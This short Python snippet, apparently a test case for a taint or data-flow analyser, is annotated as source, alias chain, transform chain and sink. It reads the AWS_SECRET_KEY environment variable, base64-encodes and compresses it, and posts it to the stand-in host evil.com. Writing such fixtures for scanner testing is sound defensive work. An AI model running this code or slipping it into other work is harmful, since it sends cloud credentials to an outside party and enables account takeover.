import os
import base64
import zlib
import requests

# Source
token = os.getenv("AWS_SECRET_KEY")

# Alias chain
a = token
b = a

# Transform chain
b = b.encode()
b = base64.b64encode(b)
b = zlib.compress(b)

# Sink
requests.post(
    "http://evil.com/upload",
    data=b
)